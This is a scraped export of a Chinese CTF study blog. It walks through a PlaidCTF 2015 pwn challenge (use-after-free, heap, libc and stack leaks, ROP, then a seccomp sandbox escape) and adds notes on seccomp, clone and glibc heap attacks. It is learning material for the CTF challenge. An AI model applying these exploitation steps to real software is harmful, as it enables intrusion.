ucontext与sigactioncontext与sigaction也有关联 https://linuxjm.osdn.jp/html/LDP_man-pages/man2/sigaction.2.html 在sa_flags指定SA_SIGINFO时(不是sa_handler)，根据sa_sigaction的signum指定对应的signal handler函数。指定的函数，第一个参数是signal 编号，第二个是指向siginfo_t的指针，第三个参数是经过(void * 类型转换)的指向ucontext_t的指针 只要正确设置，成为signal handler的函数也可以接受context作为第三个参数 ucontext的总结 非常强大的机制 使用时，可以从任意函数/地址启动任意的寄存器状态 利用这个功能，用户可以自己实现类似线程的context切换 但是，context的结构非常复杂 需要注意，没有system call DWARF 之前解释过malloc(-1)的行为 只是失败 new(-1)时，会产生std::bad_alloc 产生异常，需要手动处理 实际上尝试大概是这样 可以使用try-catch来手动处理： 那么try-catch是怎么避免异常进行还原的？ 使用IDA能够看到try catch，但不能确定范围 这是libgcc通过DWARF来确定处理的位置 DWARF 是作为调试信息，保存stack trace的机制 .debug_frame section C++的try-catch实现也使用到 .eh_frame_hdr section，.eh_frame section(CIE, FDE) 也用到了.gcc_except_table section(LSDA) libgcc中实现 https://osdn.jp/projects/drdeamon64/wiki/DWARF%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%83%95%E3%82%A9%E3%83%BC%E3%83%9E%E3%83%83%E3%83%88 https://refspecs.linuxfoundation.org/LSB_3.0.0/LSB-PDA/LSB-PDA/ehframechpt.html https://refspecs.linuxfoundation.org/LSB_3.0.0/LSB-PDA/LSB-PDA/ehframechpt.html 也存在单独的寄存器操作指令 call frame信息 CIE就像一个初期状态模板 也有readelf -wF不会显示的信息 是LSDA 可以使用katana http://www.nongnu.org/katana/ katana 相关论文及题目 http://www.cs.dartmouth.edu/~sergey/battleaxe/hackito_2011_oakley_bratus.pdf http://www.cs.dartmouth.edu/~sergey/battleaxe/hackito_2011_oakley_bratus.pdf CodeGate2014 - pwn800 - membership https://www.bpak.org/blog/2014/02/codegate-2014-membership- 800pt-pwnable-write-up/ Hack.lu 2014 - pwn500 - breakout https://github.com/jhector/breakout https://blog.leoc.io/blog/20150223/hacklu2014-breakout/","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"PlaidCTF 2015 - pwnable620(420+200) – tp - stage2","slug":"PlaidCTF-2015-pwnable620-420-200-–-tp-stage2","date":"2019-09-05T06:40:16.000Z","updated":"2019-09-05T06:41:01.499Z","comments":true,"path":"2019/09/05/PlaidCTF-2015-pwnable620-420-200-–-tp-stage2/","link":"","permalink":"https://darkwing.moe/2019/09/05/PlaidCTF-2015-pwnable620-420-200-%E2%80%93-tp-stage2/","excerpt":"","text":"Stage2 sandbox bypass Stage1已经实现了任意代码执行 接下来就是sandbox部分 目标是读取/home/tp/flag2 解析 - 整体构成 亲： fork生成子A alarm handler 在随机位置设置子A的显示 子A： seccomp clone生成子B 作为显示运行 子B： 主程序（note管理类） kernel： seccomp过滤器 子A和子B的内存空间，fd等是公用的，寄存器数据通过pipe交换使用 子B运行system call时，如果被许可才会执行 如果不被许可（必要的额外检查），返回SIGSYG信号，调用SIGSYS handler，向显示传递数据 之后显示上进行过滤器，没问题的话会再次调用system call，这时seccomp过滤器会无条件通过 显示端的过滤条件导致进程强制结束 解析 - sandbox部分 信号handler(SIGALRM)注册 从0x10000000~0x700000000000的范围中，选择两个随机区域，作为g_trusted_code使用的code区域和stack区域 g_trusted_code是子A的独立过滤器（显示端） 通过SIGALRM，10秒后结束 因为随机生成的地址作为g_trusted_code，子A向该地址写入先使用的汇编代码 因此ucontext使用的context的显示端，产生调用寄存器状况，会转送到子A 注册SIGSYS handler 亲级的随机地址是生成给g_trusted_code使用，预先申请所有可能的区域，以便可以在任何地方写入，并通知父级，已经写入完成 子A的内存空间，亲把g_trusted_code的汇编代码写入完成后，通过ucontext来切换 g_trusted_code内执行clone()，线程的一端（子B）返回，子B开始执行do_command 事前准备 依次调用一次那三个函数 显示端(独立过滤器)写入pipe管道后，system call相关寄存器从中读取数据，并执行以下检查： arg_checker() system call是open时，arg1 == /home/tp/flag1的话，OK system call是mmap/mprotect/munmap/brk/mremap的话，OK 其他的NG，之后进程整体强制结束 outside_run_check_and_do_syscall() stack上的返回地址是g_trusted_code范围以外的地址的话，NG OK的话，执行system call NG的话，进程整体强制结束 call_r12_munmap 在已经整体获取到的区域中，释放未使用的区域 生成pipe 变更g_trusted_code的内存权限 call_r13_seccomp 省略前半部分生成filter的过程，这里直接贴出生成后的filter 右下角这一大块是设置filter，filter内容参见左上注释部分 call_r14_clone 作为子A的显示端（独立过滤器） 作为子B的context切换，do_command 清空ucontext使用的context，通过clone()产生子A和子B的分歧，子A：显示端，子B：do_command arg_checker &amp; outside_run_check_and_do_syscall arg_checker() system call是open时，arg1 == /home/tp/flag1的话，OK system call是mmap/mprotect/munmap/brk/mremap的话，OK 其他的NG，之后进程整体强制结束 outside_run_check_and_do_syscall() stack上的返回地址是g_trusted_code范围以外的地址的话，NG OK的话，执行system call NG的话，进程整体强制结束 子A的sighandler 通过seccomp，system call执行失败时（收到SIGSYS），作为sighandler被调用 经过pipe到显示端，然后重新挑战 sandbox类的问题点事实上，这是一个二阶段的sandbox seccomp（kernel过滤器，不可bypass） 显示端 + seccomp 如果1失败，则使用2 在用户空间实施过滤器的seccomp seccomp会对经过这里的调用全部许可（关注点） 因此重点关注seccomp的bypass 关于seccomp的判定 seccomp对二阶段显示端是否通过时如何判定的？ 这个读一下seccomp的过滤器代码就能知道 看一下dump流程 seccomp过滤器只对应一个进程 不是从子B，从子A开始调用的是怎样判定的 在seccomp执行前的int 3断点patch ASLR有效 int 3停止时，$r12是seccomp的过滤器，这里是0x21ee45b14ed0，从这里开始dump到整个内存页结束的内容 arch 检查（是不是x86_64） 检查system call编号 检查RIP(下位32bit，上位32bit，分两次比较，RIP == 0x32b9f368f0b2的话ALLOW) 通常allow的特殊地址： 0x32b9f368f0b2（这个是每次都会变化的） 这时，0x32b9f368f000~是g_trusted_code写入的区域 diff = 0xb2 g_trusted_code + 0xb2（显示端中间） 指向存放ret地址的地方 也就是说，我们要判断g_trusted_code + 0xb0 的syscall是否被调用 总结 二阶段的sandbox 第一阶段不可bypass 第二阶段存在RIP检查 会检查是否是从显示端内的syscall开始的调用 如果是从显示端的syscall发起的调用，则seccomp会全部允许 sandbox问题攻略 在stage1已经实现了任意代码执行 如果能够直接jmp到显示端的syscall，不就可以绕过所有过滤器了吗？ 在子A内，有一个特殊的syscall可以完全通过seccomp 子A和子B共享内存空间，因此可以从子B进行jmp来调用这个syscall 问题点显示端在内存空间的哪里？ 运行时被设置在一个随机地址 地址信息，在内存中也没有残留 也就是说，不能通过内存泄漏来获取 因此，需要某种技术从内存中获取显示端的地址 能够利用的syecall是下面这些： clone, close, exit_group, read, write, rt_sigprocmask, rt_sigreturn mmap, mprotect, munmap, brk, mremap 内存空间大概是这样： 但是，实际上这些区域之间是有空隙的： 攻略idea 以适当的size进行mmap，填充这些空隙 mmap是被允许的syscall 空隙完美填充（后面是连续区域），那么后面就可能是显示端区域 如何确定后面是否是连续区域？ 访问没有mapped的区域时，会发生SIGSEGV，但存在避免SIGSEGV的方法 利用syscall判定 write(fd,buf,count) #read()也可以 mprotect(addr, len, prot) 向write或者mprotect传递位置地址作为参数，检查返回值 如果成功，就能够断定这个地址存在 算法 指定reserved size的一半，调用mmap 不能指定从哪里取得 也有可能得到的不在reserved区域范围内 当然，如果没有能够mmap的空间，会失败 如果失败，size再次减半，重试 如果成功，对后面的地址进行write，判断区域是否存在 区域可能存在，也可能不存在 不存在的情况下，离开现在已经获取到的区域，同样的size重试（第2步） 如果存在，判断它是否是code 开头四个字节是0x41 0xff 0xd4 0x48的话，可以判定是code 如果不是code，离开现在已经获取到的区域，同样的size重试（第2步） 判定成功的话，它是code 之后直接调用code + 0xb0的syscall，会允许所有的syscall open(“/home/tp/flag2”)-&gt;read()-&gt;write() exploit","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"PlaidCTF 2015 - pwnable620(420+200) – tp - stage1","slug":"PlaidCTF-2015-pwnable620-420-200-–-tp-stage1","date":"2019-08-22T07:19:49.000Z","updated":"2019-08-27T09:14:39.954Z","comments":true,"path":"2019/08/22/PlaidCTF-2015-pwnable620-420-200-–-tp-stage1/","link":"","permalink":"https://darkwing.moe/2019/08/22/PlaidCTF-2015-pwnable620-420-200-%E2%80%93-tp-stage1/","excerpt":"","text":"题目信息https://github.com/ctfs/write-ups-2015/blob/master/plaidctf-2015/pwnable/tp/problem_414d338fffb41107a3cf70bd0a7feffe.elf?raw=true 测试运行直接运行什么也不会显示，大概10秒后killed strace$ env -i strace -fi ./tp 省略前面的加载library部分 有一个alarm(10)的时间限制（造成killed的原因） clone，pipe2，prctl， syscall_317(seccomp)之类的，看起来像sandbox的system call。也有一个可疑的SIGSTOP信号 checksec防御全开 vmmap 没有自身的elf 一个非常大的mmap 开启ASLR运行$ gdb -q ./tp -ex &#39;set disable-randomization off&#39; 这次正常了，也就是说，如果关掉ASLR就不能正常运行 Stage1 暂时不需要考虑绕过sandbox sandbox部分在Stage2 这部分主要是pwn 目标是读取/home/tp/flag1 解析 - 整体构成 父进程（sandbox） 子A（sandbox） 子B（main，note管理类） 子B主要5个功能，内部实现是红黑树，node持有指向note的指针，note持有指向data的指针 解析 - 主操作部分do_command 右侧:恢复点 读取command 根据command进行分支 常规的note管理类服务 command0_new 接受要创建的note的size 但不对size进行检查 在没有对size检查的情况下生成新note 搜索已经free的note，如果存在，会再次使用它 build_node_and_insert_note 初始化与node相连的note 搜索能够构建tree的node插入点 初始化要插入tree的node 将node插入tree 在没有检查size的情况下，分配连接到note的buffer new(buffer)如果失败，产生std::bad_alloc异常，调用handler 恢复点 note使用的buffer(data)如果存在，则释放它 note自身也释放 但是data和note还是连接在一起的 这就产生了Use After Free command1_read 接收note的id，以及要读取的size 搜索指定id的note 读取note的data command2_write 接收note的id，以及要写入的size 搜索指定id的note 写入note的data command3_free 接收要变更为不可利用的note的id 搜索指定id的note clear used 比特位 command4_delete 接收要废弃的note的id 搜索指定id的note 释放node和note 攻略(stage1)环境创建tp用户，创建测试flag： 不需要alerm(10),因为有PIE，不能用peda的deactive，直接patch为alerm(0) 之后socat启动服务，因为有ASLR，不能使用gdbserver（禁用ASLR时，二进制的.text段会消失)。所以这次需要使用gdb attach： 终端1启动服务，终端3使用gdb attach，终端2为攻击者发送数据： pgrep -w &lt;filename&gt;可以筛选LWP(包括线程的进程)列表，之后使用tail -1选择最后一个生成的线程，也就是只选择子B。 但是，因为有PIE，每次attach，text的基地址都会改变 根据attach后stack上的各种值，可以计算出PIE的base： 通过vmmap检查PIE的base，这次是0x7fdc7bdcc000 根据stack上的值计算出偏移：0x7fdc7bdce34f - 0x7fdc7bdcc000= 0x234f (diff) *$rsp-0x234f == PIE的base，set $base = *(void**)$rsp-0x234f，即使有PIE，偏移量是不会改变的，因此我们可以通过每次的rsp计算出PIE的base 生成command文件将禁用SIGSYS信号的stop，print，读取heap信息，计算base等命令写到文件里，再次gdb attach： 将程序各个功能封装成函数： 生成dump函数确认UAF之前，准备好dump node和note信息的函数比较好 这样会非常效率 便于理解heap内部情况 可以看到生成了一个存在note，buffer为NULL的异常node Pwn - 生成共有状态利用UAF可以达到任意内存读写 但首先需要生成共用内存的状态 即存在两个指针A和B，指向同一块内存区域 1. _new(size=1) 创建了一个size为1的note，之后tree是这样的 2. _new(size=1) 创建一个后面用于覆盖的元素 作为id为0的node的父node，插入到tree中 3. _new(size=-1) alloc_note内部，首先生成note 接下来准备生成data 但是因为size是负数，data生成失败，malloc内部生成了thread_arena 刚才生成的note被free后，来自node的引用仍然存在 fastbins与这个note相连接，arena切换，这个note已经不能被使用 4. _new(size=-1) 同样，先在alloc_note内部，首先生成note 之后，data生成失败，如果已经存在thread_arena，malloc就不会再创建新的arena 因为data生成失败，data被free，来自node的引用仍然存在 bins和note相连接 5. _free(id=1) tree开头的节点，id=1的note设置为used=0 如果存在used=0的note，它的size与指定的size不一致，下次alloc_note时，先free(data)，然后重新分配一次 6. _new(size=0x28) 因为used=0的note的id=1，它将被再次使用 但是size不一致，会先将id=1的datafree掉 之后的malloc，会从thread_arena生成data 因为bins中存在sz=0x28的chunk，会直接再次使用，作为id=1的data 这时候，id=1的data和id=3的data是共有状态 但是，id=3的note，实际上id信息已经破坏，因此需要修正 Pwn - heap leak生成了共有状态 接下来，对id=1的data的变更操作，也会对id=3的note的data操作 可以做任意读写 如果可以指定GOT地址进行读取，就不需要考虑libc相关地址 也就是说，无视ASLR 但是因为这里同时有PIE+ASLR，我们不知道GOT(.text)的地址 可以利用Partial Overwrite，来leak内存 首先需要泄漏heap的地址（thread_arena的mapped区域） 7. _read(id=1, data=pQ(0x1337)) 更新id=1的data 这会导致id=3的note更新，变成id=0x1337 这时，id=0x1337变成used=0 8. _new(size=0x100) 因为找到的used=0的note的id=0x1337，通过alloc_note对这个note再次使用 id=0x1337，生成data size=0x100，不在bins里的小的size就可以 这时，id=0x1337的note上，生成了指向data的指针 这个指向data的指针，指向的是从thread_arena的mapped区域申请的chunk 9. _read(id=1, data=pQ(0x1337) + “\\x70\\x08”) 使用id=1，来覆盖指向id=0x1337的note的data的指针，只能写两个字节 指向0x1337的data的指针，指向的是thread_arena内部的bin上的一个chunk 可以看到，指向data的指针，后两个字节已经被重写 这次是指向mapped+0x870作为data 里面是mapped+0x858 10. _write(id=0x1337, size=8) 通过写出id=0x1337，可以泄漏mapped+0x858之类的值 泄漏的值减去0x858就能够知道heap的base地址 Pwn - libc leak 能够泄漏heap的base地址 附近(mapped+0x888)存在和libc相关的地址 从thread_arena到main_arena的next指针 这个也可以被泄漏 11. _read(id=1, data=pQ(0x1337) + “\\x88\\x08”) 使用id=1，来覆盖指向id=0x1337的note的data的指针，只能写两个字节 指向0x1337的data的指针，指向的是thread_arena的next next中是main_arena的地址 12. _write(id=0x1337, size=8) 通过写出id=0x1337，可以泄漏main_arena的地址 泄漏的值减去0x3be760就能够知道libc的base地址 Pwn - stack leak 能够泄漏libc的base地址 结合偏移量就能够计算出libc中各种函数地址 但计算出system函数并不能结束 因为有sandbox，system，execve之类的不能使用 但是heap操作必要的，mprotect/mmap这类是被允许的 最快的方法是，通过mprotect使heap权限为RWX，然后在heap中加载执行open()-&gt;read()-&gt;write()这样的shellcode 因此，策略是覆盖stack返回地址，执行mprotect()-&gt;read()这样的ROP 13. _read(id=1, data=pQ(0x1337)+pQ(libc_base+0x3c14a0)) libc中存在指向stack的__environ，__libc_stack_end变量 这里是将id=0x1337的note的data变更为__environ,也就是libc_base + 0x3c14a0 14. _write(id=0x1337, size=8) 通过写出id=0x1337，可以泄漏stack上envp[]的地址 泄漏的值减去0x200就是储存read()函数返回地址的地方 Pwn - stack伪造15. _read(id=1, data=pQ(0x1337)+pQ(ret)+pQ(len(rop))) 让id=0x1337的note指向ret 16. _read(id=0x1337, data=rop) 之后在ret附近写入ROP stage1的exploit","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"thread clone","slug":"thread-clone","date":"2019-08-14T05:45:42.000Z","updated":"2019-08-14T05:46:24.265Z","comments":true,"path":"2019/08/14/thread-clone/","link":"","permalink":"https://darkwing.moe/2019/08/14/thread-clone/","excerpt":"","text":"clone 能够生成线程的system call 适用于sandbox，出现频率非常高 clone(2)和clone(3)有区别，这里使用clone(3)进行说明 https://linuxjm.osdn.jp/html/LDP_man-pages/man2/clone.2.html 生成的子进程可以通过fn()恢复 生成的子进程，使用child_stack作为stack 因为使用父进程相同的stack会产生corrupt flags可以指定各种，sandbox问题中这些比较多： CLONE_THREAD：与父进程相同的线程组（线程必须） CLONE_SIGHAND：与父进程共享信号处理程序表（线程必须） CLONE_FILES：与父进程共享文件目录 CLONE_FS：与父进程共享文件系统信息 CLONE_VM：与父进程共享内存空间（线程必须） 特别是CLONE_VM，重要与父进程共享内存空间 没有CLONE_VM的情况，内存空间是复制后独立的 指定CLONE_VM的情况，共享内存空间 CLONE_FILES也很常见与父进程共享文件目录 没有指定CLONE_FILES的情况，fd是复制后独立的 指定CLONE_FILES的情况，共享文件目录fd clone与seccompclone(flags=CLONE_VM|…)和seccomp()很适合结合使用 两者结合的sandbox题目频出 子进程实行seccomp，后续的system call会受到内核级别的全局限制 但是如果想要执行特定的system call，需要首先通过子进程的过滤器。通过校验后，对system call进行”代理实行”处理(也存在子进程没有独立过滤器的情况) 通过预先创建的pipe管道，将寄存器及内存信息传递给父进程，代理实行 父进程通过使用对pipe管道的写入监视等来处理子进程的system call请求 通信数据通过父进程的过滤器，实行实际的system call(也存在父进程没有独立过滤器的情况) 即使子进程实行了seccomp，也与父进程无关，父进程可以自由的进行system call 因为内存空间和fd是共享的，某些system call的结果会反映在子进程中。(例如通过mmap生成新的内存区域会反映在子进程中，通过open打开文件，那么子进程也可以使用该fd) 因此可能会有非预期解法，导致子进程执行某些system call 这种类型的题目考点是“如何绕过独立过滤器” seccomp基本不可绕过 绕过对象可以是子进程的独立过滤器，也可以是父进程的 没有CLONE_VM的模式存在clone(flags=CLONE_VM|…)这样不使用CLONE_VM的模式 除了使用下面这样的pipe管道进行数据交换外，还使用ptrace， process_vm_readv，process_vm_writev等 常见模式常见模式1(有无CLONE_VM皆可) 自己独立过滤器的参数检查比较容易bypass 检查范围的溢出，index溢出，特殊字符，竞争等 常见模式2(有无CLONE_VM皆可) 首先子进程能够执行任意代码 stack BOF，heap BOF，FSB，UAF，TypeConfusion，Race等 自己独立过滤器隐含假设条件被打破，进行调用 system call参数，调用源，调用计数，上下文 常见模式3(有CLONE_VM) 利用子进程中的漏洞，创建read/write原语(一系列任意内存读写的输入) 重复内存泄漏，使ASLR无效 因为内存由CLONE_VM共享，因此父进程使用的内存被重写，就能够禁用或者绕过父进程的独立过滤器 常见模式4(无CLONE_VM) 子进程可以执行任意代码 从子进程向父进程发送意外数据，利用父进程的漏洞 造成父进程的任意代码执行 类似模式1和2，禁用父进程的独立过滤器 clone总结 CLONE_VM，CLONE_FILES比较多 皆在通过创建特殊的进程来构造sandbox问题 sandbox问题很常见","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"seccomp","slug":"seccomp","date":"2019-08-08T03:13:58.000Z","updated":"2019-08-08T03:14:38.686Z","comments":true,"path":"2019/08/08/seccomp/","link":"","permalink":"https://darkwing.moe/2019/08/08/seccomp/","excerpt":"","text":"seccomp sandbox的典型 内核层面过滤system call 只要过滤器正确注册，就无法从用户进程绕过 这个sandbox非常强，还会结合其他的过滤器作为辅助，以防止意外的解决方案 尽量使用复杂的过滤器 也存在一部分过滤器存在漏洞的题目 只过滤自己的进程，不会影响其他进程 使用seccomp(2) 或者 prctl(2)来注册过滤器 这是一种通过库函数调用的方式，稍微有点复杂 使用seccomp的流程 进程发布seccomp（后面所说的prctl） 在内核中创建过滤器，之后每次执行system call都会经过过滤器验证 该过滤器适用于这个进程的每个线程，一旦注册，在该进程结束之前就不能进行修改或者删除。 如果允许prctl，则可以添加更多过滤器。如果允许fork，则子进程继承过滤器。如果允许execve，则在execve前后过滤器保持不变。 如果是允许的system call，则内核执行 如果是不允许的system call，则根据过滤器设置进行操作 不要直接结束进程，向进程发送SIGSYS信号（无效参数）,返回错误代码，然后继续 seccomp的调用方法有多种方法可以调用，有点复杂 seccomp.h的库函数 prctl(2) seccomp(2) seccomp.h的库函数 直接使用seccomp.h中定义的库函数 最简单的调用方式 不需要了解BPF seccomp在内部实现了调用BPF(Berkeley Packet Filter)的虚拟机 封装之后，使用者不需要去了解BPF命令 只需要设置system call编号，参数检查等 自动检查平台架构 prctl(PR_SET_NO_NEW_PRIVS, …)也自动进行 无法进行EIP/RIP 基本上是这4个 scmp_filter_ctx seccomp_init(uint32_t def_action) int seccomp_rule_add(scmp_filter_ctx ctx, uint32_t action, int syscall, unsigned int arg_cnt, …) int seccomp_load(scmp_filter_ctx ctx) void seccomp_release(scmp_filter_ctx ctx) 函数定义参考这里： http://man7.org/linux/man-pages/man3/seccomp_init.3.html http://man7.org/linux/man-pages/man3/seccomp_rule_add.3.html http://man7.org/linux/man-pages/man3/seccomp_load.3.html http://man7.org/linux/man-pages/man3/seccomp_release.3.html 代码示例 SCMP_ACT_KILL: 从内核收到SIGSYS，进程推出 SCMP_ACT_ALLOW: 执行system call SCMP_ACT_TRAP: 自身发出SIGSYS SCMP_ACT_ERRNO(x): 返回错误代码 SCMP_ACT_TRACE: 由ptrace控制时发出(SIGTRAP | (PTRACE_EVENT_SECCOMP&lt;&lt;8)) 简单使用的话啊就只检查system call编号和参数是否正确 此次生成的内部BPF指令如下： 测试运行，如果禁掉了read，会得到下面的结果： prctl(2) 使用prctl定义的PR_SET_SECCOMP 存在两种模式 静态模式 用户不需要编写过滤器 静态模式只有通用的过滤器，放行read, write, exit, sigreturn 很少用于CTF 过滤模式 自己编写并注册过滤器 可以在过滤器中检查EIP/RIP 如果需要在调用system call的时候检查EIP/RIP，则不能使用seccomp.h的库函数 使用seccomp_data.instruction_pointer 但是，过滤器结构很复杂 所有BPF命令都需要自己写 平台架构的检查，system call编号及参数的检查，全都需要使用者自己编写 基本流程如下： 创建一个sock_filter结构体数组 在这里写BPF命令 从sock_filter结构体数组及其大小创建sock_fprog结构体 prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0); 如果没有这个，在第四步允许execve()的话，如果执行suid二进制文件，则uid可能改变，如果不重置该功能，可能存在各种漏洞。所以还是指定比较好。 prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog, 0, 0); 参考： https://linuxjm.osdn.jp/html/LDP_man-pages/man2/prctl.2.html http://www.tiger1997.jp/report/activity/securityreport_20131211.html http://www.tiger1997.jp/report/activity/securityreport_20131227.html FreeBSD的数据包过滤器，同呀昂存在BPF，作为参考： http://www.gsp.com/cgi-bin/man.cgi?topic=bpf http://www.yosbits.com/opensonar/rest/man/freebsd/man/ja/man4/bpf.4.html Linux中的编程示例： http://man7.org/tlpi/code/online/dist/seccomp/ 代码示例 seccomp过滤器注册后，调用system call，每次都会向内核传递这样的结构体 平台架构检查是必须的。如果不存在此检查，则可能通过将执行上下文从x86切换到x64来跳过system call编号检查 system call编号由BPF命令检查 向隐式累加器A(seccomp虚拟机的32位运算寄存器)使用seccomp_data-&gt;nr作为四个字节(BPF_W|BPF_ABS)进行加载(BPF_LD) 比较(BPF_JEQ)A与立即值(BPF_K)的__NR_XXX，根据结果产生分支(BPF_JMP) 返回(BPF_RET)立即值(BPF_K) 测试运行，如果禁掉了read，会得到下面的结果： 分析seccomp二进制文件的小技巧： 假设是prctl(2)方式的seccomp 制作BPF过滤器 但是，创建BPF过滤器时的命令逐条解析很麻烦 检查BPF过滤器的内容 使用gdb，到prctl(PR_SET_SECCOMP, …)之前 使用gdb-peda的dumpmem，dump BPF过滤器的内存范围 gdb-peda$ dumpmem /tmp/out.dmp 0xffffaaaabb00 0xffffaaaabc00 反编译dump出得BPF过滤器 $ disas-seccomp-filter /tmp/out.dmp 这样不需要知道构建过滤器过程，只需要知道最终的过滤器 seccomp(2)prctl(2)的向上兼容 使用方法与prctl(2)基本相同 但是，glibc中没有seccomp的包装函数 glibc的syscall()可以直接指定system call编号进行调用 long syscall(long number, ...); 大概是这样的流程 创建一个sock_filter结构体数组 从sock_filter结构体数组及其大小创建sock_fprog结构体 prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0); syscall(__NR_seccomp, SECCOMP_SET_MODE_FILTER, 0, &amp;prog) 与prctl(2)不同的只有第四步 可以使用SECCOMP_FILTER_FLAG_TSYNC标志来添加过滤器 添加过滤器时，请注意将同一过滤器添加到其他线程 如果存在无法添加的线程，则返回线程ID syscall(__NR_seccomp,SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_TSYNC, &amp;prog) 函数定义参考这里： http://man7.org/linux/man-pages/man2/seccomp.2.html 代码示例因为库中不存在seccomp(2)，这里使用syscall()： 这里很容易出错，（虽然它是相同的过滤模式，prctl为2，seccomp为1） 总结 seccomp.h的库函数 简单 prctl(2) 存在静态模式，过滤模式两种 可以检查EIP/RIP seccomp(2) prctl(2)的向上兼容 glibc中没有库，通过syscall()调用 存在同时向所有线程追加的选项","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"CTF中的sandbox","slug":"CTF中的sandbox","date":"2019-08-01T04:57:33.000Z","updated":"2019-08-01T04:58:10.395Z","comments":true,"path":"2019/08/01/CTF中的sandbox/","link":"","permalink":"https://darkwing.moe/2019/08/01/CTF%E4%B8%AD%E7%9A%84sandbox/","excerpt":"","text":"sandbox问题分类大体上两类 1.binary的sandbox 绕过system call过滤机制 自定义过滤器，seccomp过滤器，混合过滤器等 基本上结合pwn问题 2.program的sandbox 绕过对函数，变量，语法，字符等的过滤机制 不能使用符号，import之类语句等 python/php很常见，其他的go/JavaScript/ruby之类 大部分是misc类，也有pwn和web PWN相关问题会有最新的CVE Web问题与web服务一起发布 sandbox问题特征 即使控制了EIP/RIP，也不能调用execve()之类的危险system call system()内部也是execve()，无法调用 大多数system call都不能使用 这取决于过滤了哪些 实现实现大体上有三种方式 进程自身过滤 限制system call的调用地点和流程 实现方式最简单，也很容易绕过 父进程过滤 pipe ptrace process_vm_readv，process_vm_writev 使用clone内存共享等来过滤传输系统调用代码参数 实现比较复杂，CTF中比较多 内核过滤 seccomp 很强大，几乎不可绕过，问题实例较少，结合1和2时有很多问题 问题构成普通pwn问题构成 控制EIP/RIP后，执行system(“sh”)就可以 或者创建一个RWX区域执行shellcode sandbox问题构成 单纯控制EIP/RIP，并不能结束工作 调用禁止的system call的话，进程会停止(pwn失败) 因为sandbox过滤了execve()，所以无法获得shell 构成模式 在前段进行pwn，控制EIP/RIP后绕过sandbox过滤的模式 前段没有pwn，直接执行任意代码的模式 攻略方法 了解system call过滤处理 自定义过滤器，seccomp过滤器，混合过滤器等 在system call过滤处理中找到漏洞 CTF题目中一定存在漏洞 绕过sandbox经常需要复杂的流程 首先，需要某种方式的”任意代码执行”，这里指的是发送的任意汇编代码可以像shellcode一样执行。(因为不能打开shell 创建RWX区域执行任意代码 RWX区域可以通过mmap/mprotect来生成，如果二进制本身没有NX就太好了 绕过之后通常是open(flag) -&gt; read() -&gt; write()，因为不能使用execve 如果不能使用mmap/mprotect，那么ROP","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记23:heap与malloc(-1)","slug":"Pwn学习笔记23-heap与malloc-1","date":"2019-07-18T08:34:19.000Z","updated":"2019-07-18T08:39:48.752Z","comments":true,"path":"2019/07/18/Pwn学习笔记23-heap与malloc-1/","link":"","permalink":"https://darkwing.moe/2019/07/18/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B023-heap%E4%B8%8Emalloc-1/","excerpt":"","text":"PlaidCTF 2015 - pwnable620(420+200) - tp Use After Free + sandbox逃逸 主要三个点 heap thread arena sandbox seccomp thread clone 扩展部分并不是解题必须的，但因为相关资料较少，作为补充内容 heapThe Malloc Maleficarum 有点老（x86, glibc-2.3.5），使用malloc/free进行exploit的5种技术 https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt 除了House of Prime之外其他四种仍然有效 这里的环境是glibc-2.20 House of Lore https://gbmaster.wordpress.com/2015/07/16/x86-exploitation-101-house-of-lore-people-and-traditions/ House of Mind https://gbmaster.wordpress.com/2015/06/15/x86-exploitation-101-house-of-mind-undead-and-loving-it/ House of Force https://gbmaster.wordpress.com/2015/06/28/x86-exploitation-101-house-of-force-jedi-overflow/ House of Spirit https://gbmaster.wordpress.com/2015/07/21/x86-exploitation-101-house-of-spirit-friendly-stack-overflow/ The Malloc Maleficarum简单解说 House of Lore consolidate之后对smallbins/largebins的unlink attack。将free状态的chunk的bk修改为任意地址，之后第一次malloc到free_list的开头，第二次malloc则是我们控制的地址。尽管在unlink时已有检查机制，但是如果是相互正确引用的chunk，free状态chunk的bk指向它的话是有效的。另外，在fast bins的link list获取不检查fd/bk的size非常简单。这就是fastbins attack，本质上是House of Lore的一种 https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_lore-zh/ House of Lore 攻击与 Glibc 堆管理中的的 Small Bin 的机制紧密相关。 House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。 House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 